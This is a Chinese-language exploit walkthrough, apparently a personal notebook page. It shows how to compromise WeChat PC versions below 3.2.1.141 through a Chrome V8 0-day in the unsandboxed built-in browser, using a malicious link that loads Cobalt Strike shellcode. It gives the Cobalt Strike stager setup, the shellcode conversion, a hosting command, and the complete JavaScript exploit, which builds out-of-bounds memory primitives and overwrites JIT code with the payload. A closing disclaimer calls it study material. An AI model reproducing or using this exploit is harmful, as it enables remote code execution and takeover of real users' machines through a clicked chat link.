# WX利用Chrome 0day上线CS

Created by: Feng chen
Created time: Apr 18, 2021 8:50 AM
Last edited time: Apr 18, 2021 2:30 PM
Tags: chrome, 微信

### 一、**简介**

本次漏洞问题出现点为微信内置chrome内核浏览器，内核版本较低，并且没有开启沙盒。由于前几天chrome也爆出来0day了，而微信打开链接时，自带的浏览器会调用 chrome 内核，默认使用 –no-sandbox，所以访问带有恶意js代码时，就会造成RCE。

**影响版本**

微信 PC（Windows）< 3.2.1.141
官方链接下载更新最新 (Windows 微信 PC 3.2.1.143 版本)

```
https://dldir1.qq.com/weixin/Windows/WeChatSetup.exe
```

### 二、**CS 开启stager监听，并生成C语言的 shellcode**

使用cs开启监听，目前亲测使用本地ip开启监听有效，而使用域前置方法生成shellcode无效，具体原因还不知道，需要继续研究研究。

![](./image/Untitled.png)

![](./image/Untitled%201.png)

生成payload.c如下：

![](./image/Untitled%202.png)

### 三、格式转换

由于脚本代码的问题，需要将 shellcode 中的斜杠"`\`"替换为"`,0`"，并且删除第一个逗号，然后放入`wechat.js`中

![](./image/Untitled%203.png)

### 四、远程WEB服务开启

远程起一个web服务，然后将wechat.html和wechat.js放在同一目录下

```python
python -m SimpleHTTPServer 9090
```

![](./image/Untitled%204.png)

![](./image/Untitled%205.png)

### 五、本地测试

给自己发个链接，然后点击，就可以上线了，复现成功。

![](./image/Untitled%206.png)

![](./image/Untitled%207.png)

### 六：测试代码

wechat.html

```html
<script src= "wechat.js"></script>
```

wechat.js 代码

```jsx
ENABLE_LOG = true;
IN_WORKER = true;

// run calc and hang in a loop
var shellcode = [放入shelcode];

function print(data) {
}

var not_optimised_out = 0;
var target_function = (function (value) {
    if (value == 0xdecaf0) {
        not_optimised_out += 1;
    }
    not_optimised_out += 1;
    not_optimised_out |= 0xff;
    not_optimised_out *= 12;
});

for (var i = 0; i < 0x10000; ++i) {
    target_function(i);
}

var g_array;
var tDerivedNCount = 17 * 87481 - 8;
var tDerivedNDepth = 19 * 19;

function cb(flag) {
    if (flag == true) {
        return;
    }
    g_array = new Array(0);
    g_array[0] = 0x1dbabe * 2;
    return 'c01db33f';
}

function gc() {
    for (var i = 0; i < 0x10000; ++i) {
        new String();
    }
}

function oobAccess() {
    var this_ = this;
    this.buffer = null;
    this.buffer_view = null;

    this.page_buffer = null;
    this.page_view = null;

    this.prevent_opt = [];

    var kSlotOffset = 0x1f;
    var kBackingStoreOffset = 0xf;

    class LeakArrayBuffer extends ArrayBuffer {
        constructor() {
            super(0x1000);
            this.slot = this;
        }
    }

    this.page_buffer = new LeakArrayBuffer();
    this.page_view = new DataView(this.page_buffer);

    new RegExp({ toString: function () { return 'a' } });
    cb(true);

    class DerivedBase extends RegExp {
        constructor() {
            // var array = null;
            super(
                // at this point, the 4-byte allocation for the JSRegExp `this` object
                // has just happened.
                {
                    toString: cb
                }, 'g'
                // now the runtime JSRegExp constructor is called, corrupting the
                // JSArray.
            );

            // this allocation will now directly follow the FixedArray allocation
            // made for `this.data`, which is where `array.elements` points to.
            this_.buffer = new ArrayBuffer(0x80);
            g_array[8] = this_.page_buffer;
        }
    }

    // try{
    var derived_n = eval(`(function derived_n(i) {
        if (i == 0) {
            return DerivedBase;
        }

        class DerivedN extends derived_n(i-1) {
            constructor() {
                super();
                return;
                ${"this.a=0;".repeat(tDerivedNCount)}
            }
        }

        return DerivedN;
    })`);

    gc();

    new (derived_n(tDerivedNDepth))();

    this.buffer_view = new DataView(this.buffer);
    this.leakPtr = function (obj) {
        this.page_buffer.slot = obj;
        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);
    }

    this.setPtr = function (addr) {
        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);
    }

    this.read32 = function (addr) {
        this.setPtr(addr);
        return this.page_view.getUint32(0, true, ...this.prevent_opt);
    }

    this.write32 = function (addr, value) {
        this.setPtr(addr);
        this.page_view.setUint32(0, value, true, ...this.prevent_opt);
    }

    this.write8 = function (addr, value) {
        this.setPtr(addr);
        this.page_view.setUint8(0, value, ...this.prevent_opt);
    }

    this.setBytes = function (addr, content) {
        for (var i = 0; i < content.length; i++) {
            this.write8(addr + i, content[i]);
        }
    }
    return this;
}

function trigger() {
    var oob = oobAccess();

    var func_ptr = oob.leakPtr(target_function);
    print('[*] target_function at 0x' + func_ptr.toString(16));

    var kCodeInsOffset = 0x1b;

    var code_addr = oob.read32(func_ptr + kCodeInsOffset);
    print('[*] code_addr at 0x' + code_addr.toString(16));

    oob.setBytes(code_addr, shellcode);

    target_function(0);
}

try{
    print("start running");
    trigger();
}catch(e){
    print(e);
}
```

***声明：本次复现均在本地操作，未造成网络攻击。本文仅供学习使用，由于学习造成的一切后果本人不承担任何责任。***